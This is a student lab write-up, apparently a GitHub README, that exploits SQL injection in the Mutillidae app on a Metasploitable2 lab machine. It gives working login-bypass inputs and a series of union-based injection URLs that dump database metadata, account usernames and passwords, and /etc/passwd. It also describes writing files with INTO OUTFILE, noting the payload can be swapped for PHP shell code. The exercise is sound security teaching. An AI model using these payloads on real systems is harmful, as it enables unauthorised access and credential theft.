# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/f3d9330d-bd4e-4e21-8b50-233b1663159a)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/8327530c-6889-4f71-aa6b-43a904828537)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/d0a9b16e-d21f-44e2-b75c-ca39c9e55ef5)

Click on the menu Login/Register and register for an account

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/a4636aa5-200c-46e6-a33a-5209fd969aa9)

Click on the link “Please register here”

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/d76387df-db71-44db-8276-322795070810)

Click on “Create Account” to display the following page:

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/f824ffdf-5ede-4f56-b70a-41d539fe41e5)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/06319df3-11f2-48f6-aaab-cf55a7f981ac)

Click “Login”. The logged in page will show as below:

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/c7358c90-ae7f-4e04-b31e-c6d5c323d5d1)

##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/da73be7c-976a-49b8-9376-15d30a0dbc15)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/28c46fc2-2636-4f98-b2dd-fc5d20ba9432)

Union-based SQL injection UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/cfc7718f-5891-440b-81d5-c9b6ad78b3cf)

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/26ad105c-d876-4a1b-9a22-b8dbb8136bd8)

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/60c6deac-8f9d-440d-b493-188e3cbfd044)

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/41618a1f-3297-4984-98ea-a77e1422ab3a)

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/aac55abe-3808-40de-8e71-b68b00af5bfe)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/a150ec36-6a7e-4827-aeb6-21bb3c9289ad)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/88d5faa5-1def-4ec1-96c8-52731071d4d4)

After adding the order by 6 into the existing url , the following error statement will be obtained:

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/479044eb-e41c-4175-a443-7b0e880df7aa)

As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/12a53487-f4d4-4245-a57d-3c94259cc312)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/5e78975f-3129-46fd-aaae-0ce7063c2303)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/da0fb7f7-51fc-4f44-8318-d88754a6f57b)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/2c3e6101-5ae5-4e3f-b150-d48cec6b4d97)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

Uploading output23.png… The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table. Uploading output24.png… The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/8c49fb16-61bf-4c12-94f6-9d7851e37b64)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/81ca6a56-87e8-4136-a155-3f2a7fdcf3ab)

Reading and writing files on the web-server We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Catty12384/sqlinjection/assets/120629225/c13282c1-e4d2-48e5-8920-1638553e9205)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

# RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.



